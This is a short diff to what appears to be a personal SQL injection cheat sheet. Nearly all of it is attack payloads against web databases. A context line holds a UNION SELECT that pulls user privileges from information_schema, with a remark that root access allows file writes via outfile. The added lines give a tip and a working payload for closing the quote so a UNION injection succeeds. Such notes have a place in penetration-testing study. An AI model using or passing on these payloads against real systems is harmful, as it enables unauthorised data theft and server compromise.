@@ -12,3 +12,8 @@
 
 .146' UNION SELECT 1, 2, group_concat(grantee,is_grantable,0x3c62723e) from information_schema.user_privileges-- -
   - if YES (root) then we can use outfile
+
+
+Sometimes you have to close it properly, once I had this happen:
+EXISTENT_ID' ORDER BY 1-- - --> worked, but when I tried using comments with UNION SELECT it did not, turns out the below did:
+1111111-nonexistent' UNION SELECT 1-num-columns AND '1'='1
